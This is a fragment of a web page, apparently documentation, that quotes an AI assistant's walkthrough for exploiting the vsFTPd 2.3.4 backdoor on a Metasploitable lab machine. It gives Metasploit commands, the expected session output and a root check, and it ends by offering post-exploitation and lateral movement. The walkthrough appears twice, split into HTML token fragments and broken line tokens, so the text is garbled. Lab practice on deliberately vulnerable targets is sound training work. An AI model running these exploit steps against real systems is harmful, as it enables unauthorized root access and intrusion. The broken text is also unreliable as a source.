style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">10</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">55</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">00</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">-0500</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">id</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">5.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> Confirm Root Access</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Once you have the shell (the prompt will likely be a simple cmd </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">or</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> $ </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">or</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> be blank), run the following command </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">to</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> confirm your privileges:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">bash</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">id</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">You should see output </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">similar</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">to</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> this, confirming you </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">are</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> the root </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">user</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">uid</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">=</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">0</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">(root) gid</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">=</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">0</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">(root) </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">groups</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">=</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">0</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">(root)</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Let me know the results </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">of</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> the exploit, </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">and</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> we can discuss the next steps </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">for</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> post</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">-</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">exploitation </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">and</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">lateral</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> movement </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">on</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> the Metasploitable </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">system</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">!</span><br></div></code></pre></div></div>
+<details class="plain-large-code" data-plain-code-lines="264"><summary>Large code or log block<!-- --> · <!-- -->264<!-- --> lines · expand raw text</summary><button type="button">Copy raw text</button><pre tabindex="0"><code>Excellently chosen. The vsFTPd 
+2.3
+.4
+ Backdoor 
+on
+ port 
+21
+ 
+is
+ a high
+-
+confidence, root
+-
+level remote code execution vulnerability—the perfect starting point.
+Here 
+is
+ the plan 
+to
+ exploit it 
+and
+ gain a root shell 
+using
+ the Metasploit Framework.
+1.
+ Launch Metasploit Console
+Open
+ your terminal 
+and
+ 
+start
+ the Metasploit framework console:
+bash
+msfconsole
+2.
+ 
+Select
+ the Exploit 
+Module
+Search
+ 
+for
+ 
+and
+ 
+select
+ the 
+specific
+ 
+module
+ that Nmap identified 
+for
+ this vulnerability:
+bash
+search
+ vsftpd 
+2.3
+.4
+use exploit
+/
+unix
+/
+ftp
+/
+vsftpd_234_backdoor
+3.
+ 
+Check
+ 
+and
+ 
+Set
+ Options
+View
+ the required options 
+for
+ the module. You 
+only
+ need 
+to
+ 
+set
+ the RHOSTS (the target IP address).
+bash
+show
+ options
+Set
+ the target IP address:
+bash
+set
+ RHOSTS 
+172.16
+.59
+.128
+You can verify the change:
+bash
+show
+ options
+The RPORT 
+is
+ correctly 
+set
+ 
+to
+ 
+21
+, 
+and
+ the 
+default
+ payload (cmd
+/
+unix
+/
+interact) 
+is
+ also suitable 
+for
+ a basic interactive shell. The exploit works 
+by
+ sending a 
+specific
+ username containing a smiley face :) 
+to
+ the FTP server, which triggers a pre
+-
+set
+ command backdoor 
+on
+ port 
+6200
+/
+tcp 
+and
+ gives you command execution.
+4.
+ 
+Execute
+ the Exploit
+Run the exploit:
+bash
+exploit
+Expected Output
+If successful, Metasploit will 
+connect
+ 
+to
+ the target, send the malicious payload, 
+and
+ 
+open
+ a 
+new
+ session 
+for
+ you:
+[
+*
+] 
+172.16
+.59
+.128
+:
+21
+ 
+-
+ Connected 
+to
+ target FTP server.
+[
++
+] 
+172.16
+.59
+.128
+:
+21
+ 
+-
+ Backdoor service has been spawned 
+on
+ port 
+6200
+/
+tcp.
+[
+*
+] Command shell session 
+1
+ opened (
+172.16
+.59
+.XXX:XXXXX 
+-
+&gt;
+ 
+172.16
+.59
+.128
+:
+6200
+) 
+at
+ 
+2025
+-11
+-26
+ 
+10
+:
+55
+:
+00
+ 
+-0500
+id
+5.
+ Confirm Root Access
+Once you have the shell (the prompt will likely be a simple cmd 
+or
+ $ 
+or
+ be blank), run the following command 
+to
+ confirm your privileges:
+bash
+id
+You should see output 
+similar
+ 
+to
+ this, confirming you 
+are
+ the root 
+user
+:
+uid
+=
+0
+(root) gid
+=
+0
+(root) 
+groups
+=
+0
+(root)
+Let me know the results 
+of
+ the exploit, 
+and
+ we can discuss the next steps 
+for
+ post
+-
+exploitation 
+and
+ 
+lateral
+ movement 
+on
+ the Metasploitable 
+system
+!
+</code></pre></details>
 <p>Similarly, you can query other services:</p>
 <ul>
 <li class="">
